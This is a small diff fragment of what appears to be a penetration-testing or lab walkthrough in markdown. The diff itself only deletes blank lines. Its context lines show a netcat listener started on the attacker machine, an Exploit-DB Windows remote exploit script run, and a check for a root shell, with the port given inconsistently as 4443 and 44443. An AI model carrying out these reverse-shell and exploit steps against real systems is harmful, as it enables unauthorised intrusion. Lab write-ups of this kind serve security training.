@@ -371,8 +371,6 @@ Run `nc -nlvp 4443` on attacker machine and leave it. Eventually this will be th
 ```shell
 python /usr/share/exploitdb/exploits/windows/remote/48389.py
 ```
-
-
 ### Confirm root shell in netcat listening on 44443
 ```console
 kali@kali:~$ nc -nlvp 4443
